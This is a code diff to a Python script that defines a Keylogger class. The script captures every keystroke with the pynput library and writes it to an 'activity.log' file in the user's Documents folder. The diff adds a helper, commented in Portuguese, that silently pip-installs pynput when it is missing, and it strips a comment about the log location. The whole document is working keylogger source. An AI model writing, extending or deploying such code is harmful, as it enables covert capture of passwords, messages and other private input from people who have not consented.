@@ -1,17 +1,30 @@
-
 import logging
-from pynput import keyboard
 import threading
 import os
+import subprocess
+import sys
+
+# Função para verificar e instalar o pacote pynput
+def install_package(package):
+    try:
+        __import__(package)
+    except ImportError:
+        print(f'{package} was not found, attempting to download it..')
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
+    finally:
+        __import__(package)
+
+# Tente importar o pynput
+install_package('pynput')
+
+from pynput import keyboard
 
 class Keylogger:
-
     def __init__(self, name):
         self._name = name
 
     @property
     def name(self):
-
         return self._name
 
     @name.setter
@@ -28,15 +41,12 @@ class Keylogger:
         except AttributeError:
             logging.debug(f'{key}') 
 
-
 def run_keylogger():
     keylogger = Keylogger('SimpleKeylogger')
     keylogger.start_logging()
 
-
 if __name__ == '__main__':
-
-    documents_path = os.path.join(os.path.expanduser('~'), 'Documents') #Change 'Documents' to the path you want to store the logging info. (the path must be under C:\Users\your_user\)
+    documents_path = os.path.join(os.path.expanduser('~'), 'Documents') 
     log_file_path = os.path.join(documents_path, 'activity.log') 
     
     logging.basicConfig(
